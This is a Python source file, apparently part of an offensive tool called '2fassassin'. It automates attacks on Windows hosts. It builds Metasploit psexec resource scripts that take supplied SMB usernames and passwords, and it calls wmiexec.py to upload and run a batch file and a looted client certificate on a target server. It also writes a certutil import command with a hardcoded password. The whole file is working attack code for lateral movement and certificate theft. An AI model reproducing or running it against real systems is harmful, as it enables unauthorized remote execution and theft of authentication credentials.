#!/usr/bin/env python

import os, sys, time
from edit import writer


def generate(username, password, server_ip):
    filename = "/root/2fassassin/cert/transport/instruction/muscle"
    try:
        os.remove(filename)
    except OSError:
        pass

    string = ""
    string += "echo 'use exploit/windows/smb/psexec' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    string += "echo 'set rhost' %s >> /root/2fassassin/cert/transport/instruction/muscle" %server_ip
    string += ";"
    string += "echo 'set SMBUser' %s >> /root/2fassassin/cert/transport/instruction/muscle" %username
    string += ";"
    string += "echo 'set SMBPass' %s >> /root/2fassassin/cert/transport/instruction/muscle" %password
    string += ";"
    string += "echo 'set EXITFUNC seh' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    string += "echo 'set AutoRunScript multi_console_command -rc /root/2fassassin/cert/transport/instruction/missy' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    string += "echo 'run' >> /root/2fassassin/cert/transport/instruction/muscle"
    string += ";"
    os.system(string)
    sys.exit()

def test_phishme(fisher, username, password, victim, dns):

    string = ""
    string += "echo 'use exploit/windows/smb/psexec_psh' >> /root/2fassassin/cert/transport/instruction/test_phishme"
    string += ";"
    string += "echo 'set rhost' %s >> /root/2fassassin/cert/transport/instruction/test_phishme" %fisher
    string += ";"
    string += "echo 'set SMBUser' %s >> /root/2fassassin/cert/transport/instruction/test_phishme" %username
    string += ";"
    string += "echo 'set SMBPass' %s >> /root/2fassassin/cert/transport/instruction/test_phishme" %password
    string += ";"
    string += "echo 'set EXITFUNC seh' >> /root/2fassassin/cert/transport/instruction/test_phishme"
    string += ";"
    string += "echo 'set AutoRunScript multi_console_command -rc /root/2fassassin/cert/transport/instruction/puss' >> /root/2fassassin/cert/transport/instruction/test_phishme"
    string += ";"
    string += "echo 'run' >> /root/2fassassin/cert/transport/instruction/test_phishme"
    string += ";"
    string += "echo 'certutil -user -p PPPPassword1 -importPFX ServerCert.pfx' >> /root/2fassassin/cert/transport/instruction/server.bat"
    string += ";"
    os.system(string)
    sys.exit()


    filename = "/root/2fassassin/cert/transport/instruction/phish"
    try:
        os.remove(filename)
    except OSError:
        pass



# fuck this shit !!!
def connect(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    key = "wmiexec.py " +username
    key += ":" +password
    key += "@" +server_ip
    key += " "
    key += "put /root/2fassassin/cert/transport/key.bat"
    key += ";"
    key += "ipconfig"
    os.system(key)

    sys.exit()

def connect1(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    key = "wmiexec.py " +username
    key += ":" +password
    key += "@" +server_ip
    key += " "
    key += "put /root/2fassassin/cert/transport/key.bat"
    os.system(key)
    sys.exit()



def connect2(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    key = "wmiexec.py " +username
    key += ":" +password
    key += "@" +server_ip
    key += " "
    key += "put /root/2fassassin/loot/ClientCert.pfx"
    os.system(key)
    sys.exit()



def connect3(username, password, server_ip):
    print "\nUSERNAME:  ", username
    print "\nPASSWORD:  ", password
    print "\nWINDOWS SERVER:  ", server_ip
    print "____________________________________________________________\n"
    run = "wmiexec.py " +username
    run += ":" +password
    run += "@" +server_ip
    run += " "
    run += "C:key.bat"
    os.system(run)
    sys.exit()

__all__ = ['generate','connect1', 'connect2', 'connect3', 'test_phishme']
